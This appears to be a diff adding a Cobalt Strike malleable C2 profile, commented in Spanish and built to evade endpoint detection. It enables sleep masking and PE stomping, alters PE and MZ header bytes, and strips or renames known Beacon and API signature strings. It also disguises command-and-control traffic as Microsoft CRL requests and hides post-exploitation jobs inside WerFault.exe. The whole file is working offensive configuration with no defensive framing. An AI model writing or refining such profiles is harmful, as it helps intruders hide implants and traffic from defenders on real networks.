@@ -1,0 +1,107 @@
+stage {
+    # Evasión de EDR -> Sleep Mask Kit
+    set sleep_mask "true";
+
+    # Evasión de defensa -> Permisos de memoria y limpieza
+    set sleep_mask "true";
+    set userwx "false";                      # Evitar secciones RWX en memoria
+    set cleanup "true";                      # Limpieza de memoria tras la carga de Beacon
+    set obfuscate "true";                    # Ocultar información sensible en memoria
+    set stomppe "true";                      # Sobrescribir valores PE en la memoria virtual
+    set rich_header "\x27\xd6\x81\x46\xd4\x05\x40\xa5\x5f\xe6\x4e\x9c\xd0\x6d\x4f\xa5\x44\xd5\x1a\x0f\x5f\xab\x6c\x16\x16\xaa\xed\x71\x0d\x8d\xa2\x5d\x70\x79\x86\xba\x8e\x13\x1a\xe0"; # Ofuscar el rich header
+
+    # Modificación de encabezados
+    set magic_pe "TL";                       # Cambiar los bytes "PE" en el encabezado
+    set magic_mz_x64 "A[AS";                 # Cambiar los bytes "MZ" en el encabezado
+
+    # Transformación de cadenas sospechosas
+    transform-x64 {
+        prepend "\x66\x87\xc9\x0f\x1f\x04\x00\x45\x87\xc9\x66\x87\xd2\x44\x90\x49\x4c\x66\x90\x87\xd2\x40\x41\x0f\x1f\x00\x42\x47\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x0f\x1f\x00\x46\x40\x66\x87\xdb\x43\x48\x87\xdb";
+
+        # Transformaciones de cadenas detectadas
+        strrep "MSSE-%d-server" "";
+        strrep "http_x64.exe" "";
+        strrep "MZ" "ZM";
+        strrep "beacon_x64" "";
+        strrep "Cobaltstrike_Sleep_Decoder_Indicator" "";
+
+        # Otras transformaciones de cadenas detectadas previamente
+        strrep "_matherr(): %s in %s(%g, %g)  (retval=%g)" "";
+        strrep "_acmdln" "_cmd";
+        strrep "GetProcAddress" "GetPrAdr";
+        strrep "Address %p has no image-section" "";
+        strrep "TerminateProcess" "TrmProc";
+        strrep "VirtualAlloc" "VirtAloc";
+        strrep "VirtualProtect" "VirtPrtct";
+        strrep "CreateNamedPipeA" "CrNamPipe";
+        strrep "CreateFileA" "CrFile";
+        strrep "WriteFile" "WrFile";
+        strrep "ReadFile" "RdFile";
+        strrep "VirtualQuery failed for %d bytes at address %p" "";
+        strrep "VirtualProtect failed with code 0x%x" "";
+        strrep "malloc" "mloc";
+        strrep "free" "fr";
+        strrep "calloc" "cloc";
+        strrep "KERNEL32.dll" "KER32.dll";
+        strrep "msvcrt.dll" "mscrt.dll";
+
+        # Eliminación de más cadenas detectadas
+        strrep "%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
+        strrep "Unknown error" "";
+        strrep "Overflow range error (OVERFLOW)" "";
+        strrep "Partial loss of significance (PLOSS)" "";
+        strrep "Total loss of significance (TLOSS)" "";
+        strrep "The result is too small to be represented (UNDERFLOW)" "";
+        strrep "Unknown pseudo relocation protocol version %d." "";
+        strrep "GCC: (GNU)" "";
+    }
+}
+
+# Configuración del C2 - Evitar escaneos triviales
+http-get {
+    set uri "/news/update";                  # Modificar URI del C2 para parecer legítimo
+    set verb "POST";                         # Cambiar a POST para evitar el error
+    client {
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
+        header "Host" "crl.microsoft.com";
+        metadata {
+            netbios;
+            prepend "user=";
+            print;                           # Instrucción de terminación requerida
+        }
+    }
+    server {
+        output {
+            base64;
+            prepend ")]}'\n";
+            print;                           # Instrucción de terminación requerida
+        }
+    }
+}
+
+http-post {
+    set uri "/news/submit";                  # Modificar el endpoint de POST del C2
+    client {
+        id {
+            prepend "session=";
+            header "Cookie";
+        }
+        output {
+            base64;
+            print;                           # Instrucción de terminación requerida
+        }
+    }
+    server {
+        output {
+            base64;
+            print;                           # Instrucción de terminación requerida
+        }
+    }
+}
+
+# Configuración del post-ex (ofuscación de DLL tras ejecución y configuración de spawnto)
+post-ex {
+    set obfuscate "true";                    # Ofuscar la DLL después de la ejecución
+    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";   # Usar WerFault para 32 bits
+    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";  # Usar WerFault para 64 bits
+}
